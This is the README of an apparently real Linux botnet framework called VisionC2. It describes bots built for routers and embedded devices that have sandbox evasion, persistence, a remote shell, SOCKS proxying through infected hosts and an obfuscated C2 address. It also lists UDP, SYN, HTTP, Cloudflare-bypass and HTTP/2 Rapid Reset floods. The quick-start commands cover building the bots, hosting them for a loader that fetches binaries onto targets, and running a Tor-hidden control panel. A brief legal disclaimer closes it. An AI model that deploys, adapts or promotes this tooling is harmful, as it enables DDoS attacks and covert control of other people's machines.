<div align="center">

# VisionC2

### Advanced Linux C2 Framework

<table>
<tr>
<td width="50%">

 **Modular Bot Builds**                                                                                                                                                                                                                                                                      Per-build module selection via Go build tags — attacks, SOCKS, or shell-only. Bots advertise capabilities on join; commands only route to bots that can execute them.

</td>
<td width="50%">

**Fully Static Binaries**
Every binary runs on any Linux kernel: ancient routers, uClibc embedded devices, minimal containers. All 14 architectures produce a `statically linked` ELF.

</td>
</tr>
<tr>
<td width="50%">

**Encrypted Everything**
TLS 1.3 on port 443. AES-256-CTR config encryption with unique per-build keys. C2 address buried under 6 layers — Base64, XOR, RC4, byte substitution, MD5 checksum, AES-CTR. HMAC challenge-response auth on every connection. Zero plaintext in the binary.

</td>
<td width="50%">

**3 Control Interfaces**
Tor hidden service web panel (zero clearnet exposure). Interactive Go TUI. Telnet CLI for remote/multi-user access. RBAC across all three with 4 permission tiers. Single `users.json` shared between all interfaces.

</td>
</tr>
</table>

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)](README.md)
[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](README.md#deploying-bots)
[![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)

<br>

<details>
<summary><b>📸 Web Panel (Tor)</b></summary>
<br>
<img src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" alt="VisionC2 Tor Panel" width="100%">
</details>

<br>

<details>
<summary><b>📸 Remote Shell & File Browser</b></summary>
<br>
<img width="1199" height="703" alt="image" src="https://github.com/user-attachments/assets/6d77106a-5bc8-48d9-b15b-a89f4f365457">
</details>

<br>

<details>
<summary><b>📸 Attack Builder</b></summary>
<br>
<img width="2353" height="866" alt="image" src="https://github.com/user-attachments/assets/ea1c9717-98a1-4400-9895-cb480f4feb06">
</details>

<br>

<details>
<summary><b>📸 Manage Users</b></summary>
<br>
<img width="2375" height="1017" alt="image" src="https://github.com/user-attachments/assets/21b33bf9-ccbf-4197-933e-fc28b85923fe">
</details>

<br>

<details>
<summary><b>📸 Schedule Task</b></summary>
<br>
<img width="2365" height="535" alt="image" src="https://github.com/user-attachments/assets/e3051202-253b-46e8-9deb-680580c24602">
</details>

</div>

<br>

---

## Quick Start

### Dependencies

```bash
sudo apt update && apt install -y openssl git wget python3 screen tor upx-ucl

# Install Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

**Minimum:** 512MB RAM, 1GB storage, port 443 open inbound  
**Recommended:** Ubuntu 22.04+, 2GB+ RAM

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py
```

Select **[1] Full Setup**. The wizard prompts for your C2 address, admin port, TLS cert details, and which modules to compile into the bot (attacks, SOCKS, or both). Outputs:

- `bins/` — 14 bot binaries (x86, x64, ARM v5/6/7/64, MIPS, MIPS64, PPC64, s390x, RISC-V)
- `server` — CNC binary
- `relay_server` — SOCKS relay binary
- `cnc/certificates/` — TLS key pair
- `setup_config.txt` — full config record for later restore

### Starting the CNC

```bash
./server              # interactive launcher (choose mode on start)
./server --tui        # TUI mode directly
./server --split      # Telnet CLI on admin port
./server --daemon     # Telnet headless (no local UI)
```

Run persistently: `screen -S vision ./server` — detach with `Ctrl+A D`.

---

## Bot Module System

Bots are built with Go build tags. Unused modules are excluded from the binary entirely — not just disabled at runtime. A SOCKS-only bot contains zero flood code.

| Build Profile | Tag(s) | Binary contains |
|:---|:---|:---|
| Full | `withattacks,withsocks` | Attacks + SOCKS + shell |
| Attacks only | `withattacks` | Attacks + shell |
| SOCKS only | `withsocks` | SOCKS proxy + shell |
| Shell only | *(none)* | Remote shell + persistence only |

Each bot reports its compiled capabilities to the CNC in the REGISTER handshake. The CNC only routes attack commands to attack-capable bots and SOCKS commands to SOCKS-capable bots — no wasted traffic, no silent failures.

To change module configuration: `python3 setup.py` → **[3] Module Update & Rebuild**.

---

## setup.py Options

| Option | What it does |
|:---|:---|
| **[1] Full Setup** | New C2 address, new AES key, new tokens, new certs, choose modules, build everything |
| **[2] C2 URL Update** | Change C2 address only — keeps existing magic code, certs, and tokens |
| **[3] Module Update & Rebuild** | Change which modules compile into bots — keeps everything else |
| **[4] Restore from setup_config.txt** | Re-apply a saved config after `git pull` or fresh clone — generates fresh AES key, re-obfuscates C2, rebuilds |

---

## Architecture

```
┌─────────────┐       TLS 1.3 / 443        ┌─────────────┐
│  Operator    │◄── Tor Hidden Service ────►│  CNC Server │
│ (Browser /   │                            │   cnc/      │
│  TUI / Tel)  │                            └──────┬──────┘
└─────────────┘                                    │
                                         TLS 1.3 / 443
                                                   │
                         ┌─────────────────────────┼─────────────────────────┐
                         │                         │                         │
                   ┌─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐
                   │    Bot    │             │    Bot    │             │    Bot    │
                   │  (arm64)  │             │  (x86_64) │             │  (mips)   │
                   └───────────┘             └───────────┘             └───────────┘
```

| Component | Path | Role |
|:----------|:-----|:-----|
| **CNC** | `cnc/` | C2 server — TLS 443 for bots, embedded Tor hidden service for web panel, TUI + Telnet CLI, RBAC |
| **Bot** | `bot/` | Agent — TLS 1.3, 6-layer C2 decoding, sandbox evasion, persistence, shell, optional attacks/SOCKS |
| **Relay** | `cnc/relay/` | SOCKS5 relay — bots backconnect out, users connect on SOCKS5 port, disposable VPS infrastructure |
| **Tools** | `tools/` | Build script (`build.sh`), crypto helper, loader script |

---

## Attack Methods

### Layer 4

| Method | Description |
|:-------|:------------|
| **UDP Flood** | High-volume 1024-byte UDP payloads |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports via raw TCP |
| **ACK Flood** | ACK packet spam via raw TCP |
| **GRE Flood** | Protocol 47, maximum payload |
| **DNS Flood** | Randomized query types against resolver pool |

### Layer 7

| Method | Description |
|:-------|:------------|
| **HTTP Flood** | GET/POST with randomized headers and user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse and fingerprinting |
| **Rapid Reset** | HTTP/2 CVE-2023-44487 — HEADERS + RST_STREAM at scale |

All L7 methods support HTTP and SOCKS5 proxy rotation via `-p <proxy_list_url>`.

> Attack methods are only compiled into bots built with the `withattacks` tag.

---

## SOCKS5 Proxy

Bots backconnect to a relay server — they never open an inbound port. The relay accepts SOCKS5 clients on its public port and tunnels traffic through to the target via the bot.

```
Client → [SOCKS5] → Relay ←── [backconnect TLS] ──← Bot → Target
```

Relay servers are managed at runtime from the CNC dashboard — no rebuild required to add or remove endpoints.

> SOCKS is only compiled into bots built with the `withsocks` tag.

---

## Deploying Bots

Host compiled binaries on a separate VPS:

```bash
sudo apt install -y apache2
sudo cp bins/* /var/www/html/bins/
sudo systemctl start apache2
```

Edit `tools/loader.sh` line 3 with your server IP:

```bash
SRV="http://<your-server-ip>/bins"
```

The loader auto-detects the target architecture and fetches the matching binary from the 14 available variants.

---

## CNC Interfaces

<img src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" alt="VisionC2 TUI" width="100%">

| Interface | Access | Use Case |
|:----------|:-------|:---------|
| **Tor Web Panel** | `.onion` via Tor Browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log, user admin |
| **Go TUI** | `./server --tui` | Local interactive terminal with live bot feed and attack launcher |
| **Telnet CLI** | `./server --split` | Lightweight remote access, multi-user, scriptable |

---

## Documentation

| Document | Description |
|:---------|:------------|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | System design, encryption layers, protocol details |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Complete TUI command and hotkey reference |
| [`SETUP.md`](Docs/SETUP.md) | Detailed installation and configuration guide |
| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment and configuration |

---

## Troubleshooting

<details>
<summary><b>"go: command not found" or wrong Go version</b></summary>

```bash
export PATH=$PATH:/usr/local/go/bin
go version  # should show 1.24+
```
</details>

<details>
<summary><b>"Permission denied" starting server on port 443</b></summary>

```bash
sudo setcap 'cap_net_bind_service=+ep' ./server
```
</details>

<details>
<summary><b>Bots won't connect</b></summary>

- Confirm port 443 is open: `sudo ufw allow 443/tcp`
- Verify C2 address in `setup_config.txt` matches your server's public IP
- Test TLS: `openssl s_client -connect YOUR_IP:443`
- Enable verbose logging: rerun `setup.py` with debug mode ON and check stdout
</details>

<details>
<summary><b>Relay server won't start</b></summary>

- Check port availability: `ss -tulpn | grep :1080`
- Confirm the binary is executable: `chmod +x relay_server`
- Verify the auth key matches the CNC magic code in `setup_config.txt`
</details>

---

## Legal Disclaimer

For authorized security research and educational purposes only. Usage against systems without explicit prior consent is illegal. The developer assumes no liability for misuse.

---

<div align="center">

**Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)

</div>
